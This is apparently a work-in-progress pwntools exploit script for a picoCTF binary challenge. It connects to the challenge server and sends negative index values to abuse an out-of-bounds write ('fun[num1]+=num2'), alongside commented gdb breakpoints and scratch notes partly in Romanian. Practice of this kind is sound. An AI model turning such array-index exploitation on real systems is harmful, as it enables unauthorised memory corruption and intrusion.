from pwn import *
elf = ELF('/home/kali/Downloads/vuln')
p=elf.process()
p=remote('saturn.picoctf.net', 51705)

#negative numbers
#gdb.attach(p, gdbscript='''
#set $var_90 = 0x0804838c
#b* 0x80495F0 
#b* 0x8049452
#c
#search-pattern "testing"
#''')

#bp1 - if(numbers<=9)
#bp2 - calculate_story_score(input, input_size)

#instad of overwiring input, overwrite input_size?
#OR maybe we can overwrite the entire LINE. like 
#overwrite 0x804945F by scrambling it with the +var_90
#apparently var_90 was just num2

#0x8049558
p.recvuntil(b'>> ')
p.sendline(b'inputexamplAA')
p.recvuntil(b'10.')
p.sendline(b'-16') #cred ca daca bag o valoare imensa negativa?
p.sendline(b'-314')

#inca nuj cum kkt ala de heap intra in discutie!

# fun[num1]+=num2 
p.interactive()
